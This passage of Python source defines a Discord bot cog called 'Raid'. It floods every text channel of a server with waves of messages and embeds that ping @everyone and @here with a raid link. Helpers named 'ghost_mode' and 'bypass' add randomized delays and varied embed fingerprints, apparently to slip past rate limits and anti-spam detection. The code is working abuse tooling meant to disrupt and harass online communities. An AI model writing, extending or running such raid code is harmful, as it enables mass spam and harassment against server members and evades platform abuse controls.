            for wave in range(WAVE_COUNT):
                if bot_state.stop_event.is_set():
                    break

                await bp.ghost_mode(min_s=2.0, max_s=5.0)

                if bot_state.stop_event.is_set():
                    break

                channels = guild.text_channels
                if not channels:
                    continue

                wave_tasks = []
                for ch in channels:
                    if embed_storm and wave % 2 == 0:
                        wave_tasks.append(self._embed_burst(ch, msgs_per // 3))
                    else:
                        wave_tasks.append(self._direct_spam(ch, msgs_per // 3))
                await asyncio.gather(*wave_tasks, return_exceptions=True)
        except asyncio.CancelledError:
            pass

    async def _embed_burst(self, channel: discord.TextChannel, count: int) -> None:
        bp = bot_state.bypass
        for i in range(count):
            if bot_state.stop_event.is_set():
                break
            embed = bp.fp.embed(i)
            await bp.execute(
                ROUTE_WEBHOOK_SEND,
                lambda c=channel, em=embed: c.send(
                    content=f"@everyone @here {RAID_LINK}",
                    embed=em,
                    allowed_mentions=discord.AllowedMentions(everyone=True, roles=True),
                ),
                bot_state.stop_event,
            )

    # ── Error handler ──────────────────────────────────────────────────────────
    @raid.error
    async def raid_error(
        self, interaction: discord.Interaction, error: app_commands.AppCommandError
    ) -> None:
        if isinstance(error, app_commands.MissingPermissions):
            await interaction.response.send_message(
                "❌ You need **Administrator** permission.", ephemeral=True
            )
        else:
            await interaction.response.send_message(f"❌ {error}", ephemeral=True)


async def setup(bot: commands.Bot) -> None:
    await bot.add_cog(Raid(bot))
